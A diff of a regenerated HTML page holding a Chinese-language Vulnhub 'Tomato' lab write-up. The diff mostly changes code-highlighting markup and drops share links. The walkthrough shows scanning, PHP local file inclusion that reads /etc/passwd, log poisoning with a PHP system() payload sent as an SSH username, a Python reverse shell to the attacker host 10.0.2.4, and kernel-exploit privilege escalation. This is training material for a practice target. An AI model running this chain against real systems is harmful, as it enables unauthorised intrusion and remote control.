@@ -110,30 +110,12 @@
         <li><a class="icon" aria-label="下一篇" href="/2022/05/03/20%20Vulnhub%20Gemini_Inc_2%20Writeup/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
         
         <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
-        <li><a class="icon" aria-label="分享文章" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
       </ul>
       <span id="i-prev" class="info" style="display:none;">上一篇</span>
       <span id="i-next" class="info" style="display:none;">下一篇</span>
       <span id="i-top" class="info" style="display:none;">返回顶部</span>
-      <span id="i-share" class="info" style="display:none;">分享文章</span>
     </span>
     <br/>
-    <div id="share" style="display: none">
-      <ul>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://hdfzzf.github.io/2022/05/05/22%20Vulnhub%20Tomato%20Writeup/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://hdfzzf.github.io/2022/05/05/22%20Vulnhub%20Tomato%20Writeup/&text=22 Vulnhub Tomato Writeup"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://hdfzzf.github.io/2022/05/05/22%20Vulnhub%20Tomato%20Writeup/&title=22 Vulnhub Tomato Writeup"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://hdfzzf.github.io/2022/05/05/22%20Vulnhub%20Tomato%20Writeup/&is_video=false&description=22 Vulnhub Tomato Writeup"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=22 Vulnhub Tomato Writeup&body=Check out this article: https://hdfzzf.github.io/2022/05/05/22%20Vulnhub%20Tomato%20Writeup/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://hdfzzf.github.io/2022/05/05/22%20Vulnhub%20Tomato%20Writeup/&title=22 Vulnhub Tomato Writeup"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://hdfzzf.github.io/2022/05/05/22%20Vulnhub%20Tomato%20Writeup/&title=22 Vulnhub Tomato Writeup"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://hdfzzf.github.io/2022/05/05/22%20Vulnhub%20Tomato%20Writeup/&title=22 Vulnhub Tomato Writeup"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://hdfzzf.github.io/2022/05/05/22%20Vulnhub%20Tomato%20Writeup/&title=22 Vulnhub Tomato Writeup"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://hdfzzf.github.io/2022/05/05/22%20Vulnhub%20Tomato%20Writeup/&name=22 Vulnhub Tomato Writeup&description=&lt;p&gt;该靶机难度比较简单。&lt;/p&gt;"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://hdfzzf.github.io/2022/05/05/22%20Vulnhub%20Tomato%20Writeup/&t=22 Vulnhub Tomato Writeup"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
-</ul>
-
-    </div>
     <div id="toc">
       <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%9D%B6%E6%9C%BA%E4%BF%A1%E6%81%AF"><span class="toc-number">1.</span> <span class="toc-text">1. 靶机信息</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%B8%97%E9%80%8F"><span class="toc-number">2.</span> <span class="toc-text">2. 渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E7%AB%AF%E5%8F%A3%E6%9C%8D%E5%8A%A1%E5%8F%91%E7%8E%B0"><span class="toc-number">2.1.</span> <span class="toc-text">2.1. 主机发现、端口扫描、端口服务发现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#http%E6%9C%8D%E5%8A%A1-get-shell"><span class="toc-number">2.2.</span> <span class="toc-text">2.2. http服务 + get shell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#http%E6%9C%8D%E5%8A%A1"><span class="toc-number">2.2.1.</span> <span class="toc-text">2.2.1. http服务</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#get-shell"><span class="toc-number">2.2.2.</span> <span class="toc-text">2.2.2. get shell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-number">2.3.</span> <span class="toc-text">2.3. 权限提升</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">3.</span> <span class="toc-text">3. 总结</span></a></li></ol>
     </div>
@@ -160,8 +142,6 @@
     <div class="postdate">
       
         <time datetime="2022-05-04T16:00:00.000Z" itemprop="datePublished">2022-05-05</time>
-        
-        (Updated: <time datetime="2022-05-05T11:07:51.316Z" itemprop="dateModified">2022-05-05</time>)
         
       
     </div>
@@ -215,9 +195,7 @@
 </ul>
 <h1 id="渗透">2. 渗透</h1>
 <h2 id="主机发现端口扫描端口服务发现">2.1. 主机发现、端口扫描、端口服务发现</h2>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> arp-scan -l
-<span class="token function">sudo</span> nmap -p- <span class="token number">10.0</span>.2.26
-<span class="token function">sudo</span> nmap -p21,80,2211,8888 -A <span class="token number">10.0</span>.2.26<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo arp-scan -l</span><br><span class="line">sudo nmap -p- 10.0.2.26</span><br><span class="line">sudo nmap -p21,80,2211,8888 -A 10.0.2.26</span><br></pre></td></tr></table></figure>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220505182423.png" /></p>
 <p>信息如下：</p>
 <ol type="1">
@@ -228,30 +206,23 @@
 <h2 id="http服务-get-shell">2.2. http服务 + get shell</h2>
 <h3 id="http服务">2.2.1. http服务</h3>
 <p>虽然我后访问的8888端口，但是那个端口需要认证，而即使我拿特别大的字典也无法爆破成功，因为放弃了。</p>
-<p>直接访问80端口，发现只有一张图片，因此进行路径扫描： <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">dirsearch -u http://10.0.2.26/ -w /usr/share/dirb/wordlists/common.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
-<p>除了 index.html 之外，还扫描出一个目录 antibot_image，该目录下存在许多文件，但是所有的php文件都是空白，图片和txt文件没有有用的信息，只有info.php是有显示的，查看源码得到提示： <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span> <span class="token operator">&lt;</span><span class="token operator">/</span><span class="token operator">?</span>php <span class="token keyword">include</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'image'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token operator">--</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
-<p>根据提示，猜测可能存在文件包含漏洞，因此输入如下payload尝试： <pre class="line-numbers language-url" data-language="url"><code class="language-url">?image&#x3D;&#x2F;etc&#x2F;passwd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
+<p>直接访问80端口，发现只有一张图片，因此进行路径扫描： <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u http://10.0.2.26/ -w /usr/share/dirb/wordlists/common.txt</span><br></pre></td></tr></table></figure></p>
+<p>除了 index.html 之外，还扫描出一个目录 antibot_image，该目录下存在许多文件，但是所有的php文件都是空白，图片和txt文件没有有用的信息，只有info.php是有显示的，查看源码得到提示： <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- &lt;/?php <span class="keyword">include</span> <span class="variable">$_GET</span>[<span class="string">&#x27;image&#x27;</span>]; --&gt;</span><br></pre></td></tr></table></figure></p>
+<p>根据提示，猜测可能存在文件包含漏洞，因此输入如下payload尝试： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?image=/etc/passwd</span><br></pre></td></tr></table></figure></p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220505183012.png" /></p>
 <p>如果有远程包含那就更好了，但是很可惜，并不存在远程文件包含</p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220505183102.png" /></p>
-<p>因此，接下来优先考虑tomato的家目录下是否存在id_rsa <pre class="line-numbers language-url" data-language="url"><code class="language-url">?image&#x3D;&#x2F;home&#x2F;tomato&#x2F;.shh&#x2F;id_rsa<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
+<p>因此，接下来优先考虑tomato的家目录下是否存在id_rsa <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?image=/home/tomato/.shh/id_rsa</span><br></pre></td></tr></table></figure></p>
 <p>很遗憾，没有任何结果，但这并不意味不存在，也有可能是没有读取权限。</p>
-<p>接下来利用文件包含的经典利用方式，那就是包含日志。从之前的服务发现中可以看到有ftp和ssh，那么我们远程连接这两个服务的时候就会记录到日志中，ssh的默认日志路径为: /var/log/auth.log <pre class="line-numbers language-url" data-language="url"><code class="language-url">?image&#x3D;&#x2F;var&#x2F;log&#x2F;auth.log<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
-<p>我在kali上利用ssh随便连接了一下，在日志中看到用户名被记录了下来 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root💀kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Downloads<span class="token punctuation">]</span>
-└─<span class="token comment"># ssh sfasdfashfkashgksg@10.0.2.26 -p 2211                                                                                                                 255 ⨯</span>
-sfasdfashfkashgksg@10.0.2.26<span class="token string">'s password: 
-Permission denied, please try again.
-sfasdfashfkashgksg@10.0.2.26'</span>s password: 
-Permission denied, please try again.
-sfasdfashfkashgksg@10.0.2.26's password: 
-sfasdfashfkashgksg@10.0.2.26: Permission denied <span class="token punctuation">(</span>publickey,password<span class="token punctuation">)</span>.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
+<p>接下来利用文件包含的经典利用方式，那就是包含日志。从之前的服务发现中可以看到有ftp和ssh，那么我们远程连接这两个服务的时候就会记录到日志中，ssh的默认日志路径为: /var/log/auth.log <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?image=/var/log/auth.log</span><br></pre></td></tr></table></figure></p>
+<p>我在kali上利用ssh随便连接了一下，在日志中看到用户名被记录了下来 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/Downloads]</span><br><span class="line">└─<span class="comment"># ssh sfasdfashfkashgksg@10.0.2.26 -p 2211                                                                                                                 255 ⨯</span></span><br><span class="line">sfasdfashfkashgksg@10.0.2.26<span class="string">&#x27;s password: </span></span><br><span class="line"><span class="string">Permission denied, please try again.</span></span><br><span class="line"><span class="string">sfasdfashfkashgksg@10.0.2.26&#x27;</span>s password: </span><br><span class="line">Permission denied, please try again.</span><br><span class="line">sfasdfashfkashgksg@10.0.2.26<span class="string">&#x27;s password: </span></span><br><span class="line"><span class="string">sfasdfashfkashgksg@10.0.2.26: Permission denied (publickey,password).</span></span><br></pre></td></tr></table></figure></p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220505183500.png" /></p>
 <h3 id="get-shell">2.2.2. get shell</h3>
-<p>我们可以构造如下payload，然后ssh连接，这样子这句payload就会被记录到日志中 <pre class="line-numbers language-php" data-language="php"><code class="language-php">ssh '<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">echo</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"cmd"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token delimiter important">?></span></span>'@10.0.2.26 -p 2211<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
+<p>我们可以构造如下payload，然后ssh连接，这样子这句payload就会被记录到日志中 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh <span class="string">&#x27;&lt;?php echo system($_GET[&quot;cmd&quot;])?&gt;&#x27;</span>@<span class="number">10.0</span>.<span class="number">2.26</span> -p <span class="number">2211</span></span><br></pre></td></tr></table></figure></p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220505183804.png" /></p>
 <p>注意到这里没有显示我们注入的payload。这是好事还是坏事呢？这是好事！如果这里显示了payload，就知道服务器只把我们的payload当作普通的文本展示出来；而不显示则说明，服务器很大可能把payload作为代码执行了。可以利用php://fliter读取一下该日志</p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220505184055.png" /></p>
-<p>尝试一下能否执行代码 <pre class="line-numbers language-url" data-language="url"><code class="language-url">?image&#x3D;&#x2F;var&#x2F;log&#x2F;auth.log&amp;cmd&#x3D;id<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
+<p>尝试一下能否执行代码 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?image=/var/log/auth.log&amp;cmd=id</span><br></pre></td></tr></table></figure></p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220505184141.png" /></p>
 <p>因此这里可以执行命令，那么反弹shell就很简单了，经过尝试发现：</p>
 <ol type="1">
@@ -261,7 +232,7 @@ sfasdfashfkashgksg@10.0.2.26: Permission denied <span class="token punctuation">
 <li>存在perl，也可以利用</li>
 <li>bash配合重定向反弹shell失败</li>
 </ol>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python3 -c <span class="token string">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.2.4",3333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.2.4&quot;,3333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);&#x27;</span></span><br></pre></td></tr></table></figure>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220505184423.png" /></p>
 <p>成功get shell。</p>
 <h2 id="权限提升">2.3. 权限提升</h2>
@@ -278,8 +249,7 @@ sfasdfashfkashgksg@10.0.2.26: Permission denied <span class="token punctuation">
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220505190135.png" /></p>
 <p>首先确定靶机上有没有gcc，该靶机上并没有，因此在kali上编译之后再传给靶机。如果靶机有，最好就是在靶机上编译。</p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220505190406.png" /></p>
-<p>读取flag： <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">/root/proof.txt
-Sun_CSR_TEAM_TOMATO_JS_0232xx23<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></p>
+<p>读取flag： <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/root/proof.txt</span><br><span class="line">Sun_CSR_TEAM_TOMATO_JS_0232xx23</span><br></pre></td></tr></table></figure></p>
 <h1 id="总结">3. 总结</h1>
 <p>该靶机挺简单的，漏洞也很常见，不过还是学到了两点：</p>
 <ol type="1">
@@ -342,7 +312,6 @@ Sun_CSR_TEAM_TOMATO_JS_0232xx23<span aria-hidden="true" class="line-numbers-rows
     <div id="actions-footer">
         <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
         <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
-        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
         <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
     </div>
 
